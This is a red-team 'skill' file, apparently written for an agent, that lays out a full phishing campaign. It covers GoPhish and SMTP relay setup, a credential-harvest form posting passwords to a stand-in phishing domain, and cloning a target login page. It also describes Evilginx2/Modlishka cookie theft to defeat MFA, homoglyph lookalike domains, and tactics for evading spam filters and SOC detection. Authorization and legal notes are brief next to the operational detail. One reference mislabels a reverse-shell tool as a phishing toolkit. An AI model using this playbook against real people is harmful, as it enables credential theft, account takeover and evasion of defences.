---
name: phishing-operations
description: Phishing campaign operations — GoPhish deployment, email template crafting, SMTP relay setup, landing page cloning, and KPI tracking for red team exercises
version: 1.0.0
phase: post
category: post-exploitation
tags: [phishing, social-engineering, gophish, smtp]
tools: [gophish, python3, docker, terraform, nginx]
difficulty: advanced
opsec_level: high
time_estimate: varies
severity_if_found: high
mitre_attack:
  - T1566
  - T1598
---

## When to Use

Use this skill during the initial access or lateral movement phase when you need to gain a foothold through human-targeted attacks. Phishing supports credential harvesting, MFA bypass, payload delivery, and internal network reconnaissance via callback detection.

**Not** for untargeted spam — this is for assessed red team operations with defined scope and authorized target lists.

## What It Does

Deploys and manages GoPhish for phishing campaigns: configures SMTP relays with proper SPF/DKIM/DMARC alignment, crafts evasive HTML email templates with tracking pixels, clones landing pages for credential harvesting, implements MFA-bypass reverse proxy techniques, and tracks campaign KPIs to measure effectiveness.

## Methodology

### Phase 1: Infrastructure Setup

**GoPhish deployment:**

```bash
# Docker — fastest path
docker run -d --name gophish -p 3333:3333 -p 80:80 -p 443:443 \
  -v gophish-data:/opt/gophish gophish/gophish

# Retrieve auto-generated admin password
docker logs gophish 2>&1 | grep "admin"

# Secure the admin interface — bind to localhost with SSH tunnel:
docker run -d --name gophish -p 127.0.0.1:3333:3333 ...
# Then: ssh -L 3333:localhost:3333 user@vps
```

**SMTP relay setup:**

| Relay | Pros | Cons |
|-------|------|------|
| SendGrid | High deliverability, good reputation | Requires CC fraud whitelist |
| AWS SES | Scalable, cheap | Sandbox limits, domain must verify |
| Self-hosted Postfix | Full control | Reputation must be built |
| Mailgun | Good for dev domains | $35/mo minimum |

```bash
# SPF record (DNS): v=spf1 include:spf.sendgrid.net ~all
# DKIM: generate 1024-bit key, add CNAME from SendGrid
# DMARC: _dmarc.domain.tld → v=DMARC1;p=quarantine;sp=reject;pct=100
```

**Domain reputation warming:**

- Send 3-5 warm-up emails/day for 7-14 days to legitimate addresses
- Use Mailgun/SendGrid dedicated IP pools
- Monitor bounce rates — >3% triggers reputation penalties
- If using a fresh domain, avoid the word "phishing" in content

### Phase 2: Email Template Crafting

```html
<!-- HTML template with embedded tracking pixel -->
<img src="https://phish-domain.tld/track/{{.TrackingURL}}" width="1" height="1" />

<!-- Credential harvest form (included inline) -->
<form action="https://phish-domain.tld/login" method="POST">
  <input type="text" name="username" placeholder="Email" />
  <input type="password" name="password" placeholder="Password" />
  <input type="hidden" name="csrf" value="fixed" />
  <button type="submit">Sign In</button>
</form>
```

**GoPhish template variables:**

- `{{.FirstName}}`, `{{.LastName}}`, `{{.Email}}` — recipient fields
- `{{.URL}}` — phishing landing page URL (per-recipient unique)
- `{{.TrackingURL}}` — 1x1 tracking pixel endpoint

**Evasive techniques:**

- Avoid aggressive trigger words: `password`, `verify account`, `action required` if inbox filters are aggressive
- Use text-to-HTML ratio >60% to avoid spam classification
- Include unsubscribe links (governed by CAN-SPAM)
- Render test emails to multiple providers before launch

### Phase 3: Landing Page Cloning

```bash
# Clone target login page with wget
wget -k -K -E -r -l 10 -p -N -F --restrict-file-names=windows \
  https://login.target.com/

# Import as GoPhish landing page (paste served HTML)
# -- go-phish will serve it at https://phish-domain.tld/

# Customize form action to POST to GoPhish's capture endpoint
# GoPhish auto-generates capture URLs from landing page settings
```

**MFA bypass with reverse proxy:**

```bash
# Evilginx2 — reverse proxy that captures session cookies post-auth
# https://github.com/kgretzky/evilginx2
./evilginx2
# configure phishlet for the target IdP (Azure AD, Okta, ADFS)
# phishlet defines the auth flow stages to capture

# Modlishka — alternative reverse proxy
# https://github.com/drk1wi/Modlishka
```

**Modlishka** and **Evilginx2** sit between the user and the real login page. The user authenticates against the real IdP, the proxy captures the resulting session token/cookie, and the attacker reuses it. This defeats TOTP, push notification, and SMS MFA in a single session.

### Phase 4: Sending Profiles & Campaign Management

| Setting | Recommendation |
|---------|---------------|
| Interface type | SMTP |
| Host | smtp.sendgrid.net:587 |
| Auth mechanism | LOGIN or PLAIN (STARTTLS) |
| Headers | Add `X-Priority: 3`, `X-Mailer: Microsoft Outlook 16` |
| Send rate | 30-60 emails/hour *per sending profile* |
| Max per domain | <200 before temporary block |

**Campaign KPI tracking:**

| Metric | Industry Average | Red Team Target |
|--------|------------------|-----------------|
| Open rate | 20-30% | >25% |
| Click rate | 2-5% | >10% |
| Credential submission | 1-2% | >5% |
| Reported (to SOC) | — | <1% |
| Bounce rate | <3% | <2% |

### Phase 5: Evasion

**SPF/DKIM/DMARC bypass:**

- If the target domain has `-all` (hard fail) SPF, you MUST spoof from an authorized domain
- If the target domain has `~all` (soft fail), some providers still deliver — test first
- DKIM-sign with your own domain; recipients see `d=phish-domain.tld` but `From` in body
- DMARC `p=reject` blocks spoofed from domains — use lookalike domains instead

**Lookalike domain registration:**

- Homoglyph attacks: `rnicrosoft.com` (rn ≠ m), `paypaI.com` (capital I ≠ l)
- Subdomain: `login-target.com` vs `target.com`
- TLD swap: `target.io`, `target.co`, `target.net`
- Since 2024, many registrars block homoglyph domains — pre-register during assessment prep

**Mailbox provider evasion:**

- Warm up sending domain 7-14 days before campaign
- Use engagement farming: recipients who open/click stay on the list
- Remove hard bounces immediately — they damage reputation
- Gmail: uses engagement-based filtering; low-open-ratio senders go to Spam

## Detection & OPSEC

**Kill chain detection by SOC:**
- SIEM detects `POST /api/submit` to unknown domain (GoPhish capture endpoint)
- Abnormal login geolocation from harvested credentials (use VPN close to target)
- Volume analysis: >50 identical emails/minute triggers flow alerts
- URL sandboxing: GoPhish URLs sometimes fail in sandboxes (no Deep Content Inspection bypass)

**OPSEC guidelines:**
- Never reuse phishing infrastructure for multiple assessments
- Use separate VPS per campaign domain
- Redirector in front of GoPhish (NGINX) to hide the GoPhish fingerprint
- GoPhish serves default favicon and header — change both
- Change admin password from default on first login
- Use HTTPS with valid Let's Encrypt certificates (never self-signed)
- Landing pages must serve over HTTPS to avoid browser "Not Secure" warnings

**Legal:**
- Ensure scope explicitly covers social engineering
- Target email addresses must be in-scope (no accidental third-party targeting)
- Check CAN-SPAM, GDPR, and local anti-phishing laws
- Document authorization letter before sending a single email

## References

- GoPhish documentation: https://docs.getgophish.com/
- Evilginx2: https://github.com/kgretzky/evilginx2
- Modlishka: https://github.com/drk1wi/Modlishka
- SPF/DKIM/DMARC checker: https://www.mxtoolbox.com/
- Can I spoof (domain checker): https://github.com/chenjj/espoofer
- Red Team Phishing Toolkit comparison: https://github.com/t3l3machus/hoaxshell (alternative)
